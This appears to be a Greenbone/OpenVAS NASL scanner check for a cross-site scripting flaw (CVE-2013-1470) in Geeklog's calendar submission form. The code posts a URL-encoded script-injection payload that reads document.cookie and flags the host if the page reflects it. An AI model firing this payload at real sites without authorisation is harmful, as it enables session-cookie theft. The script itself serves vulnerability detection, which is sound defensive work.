if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804237" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2013-1470" );
	script_bugtraq_id( 58209 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-02-13 18:21:52 +0530 (Thu, 13 Feb 2014)" );
	script_name( "Geeklog Calendar Plugin Cross Site Scripting Vulnerability" );
	script_tag( name: "summary", value: "This host is running Geeklog and is prone to cross site scripting
  vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP POST request and check whether it is
  able to read the string or not." );
	script_tag( name: "insight", value: "The flaw is due to input passed via the 'calendar_type' parameter to
  'submit.php', which is not properly sanitised before using it." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to steal the victim's
  cookie-based authentication credentials." );
	script_tag( name: "affected", value: "Geeklog 1.8.2 and 2.0.0, Other versions may also be affected." );
	script_tag( name: "solution", value: "Upgrade to version 1.8.2sr1, 2.0.0rc2 or later." );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/82326" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/120593" );
	script_xref( name: "URL", value: "http://www.geeklog.net/article.php/geeklog-1.8.2sr1" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_xref( name: "URL", value: "https://www.geeklog.net" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
geekPort = http_get_port( default: 80 );
if(!http_can_host_php( port: geekPort )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/geeklog", "/cms", "/blog", http_cgi_dirs( port: geekPort ) ) {
	if(dir == "/"){
		dir = "";
	}
	geekReq = http_get( item: dir + "/admin/moderation.php", port: geekPort );
	geekRes = http_keepalive_send_recv( port: geekPort, data: geekReq );
	if(ContainsString( geekRes, "geeklog.net" ) && ContainsString( geekRes, "Username:" ) && ContainsString( geekRes, "Password:" )){
		url = dir + "/submit.php?type=calendar";
		payload = "mode=Submit&calendar_type=%22%3E%3Cscript%3Ealert%28document" + ".cookie%29%3B%3C%2Fscript%3E";
		host = http_host_name( port: geekPort );
		geekReq = NASLString( "POST ", url, " HTTP/1.0\\r\\n", "Host: ", host, "\\r\\n", "Connection: keep-alive\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( payload ), "\\r\\n\\r\\n", payload );
		geekRes = http_keepalive_send_recv( port: geekPort, data: geekReq, bodyonly: FALSE );
		if(IsMatchRegexp( geekRes, "^HTTP/1\\.[01] 200" ) && ContainsString( geekRes, "><script>alert(document.cookie);</script>" )){
			security_message( port: geekPort );
			exit( 0 );
		}
	}
}
exit( 99 );

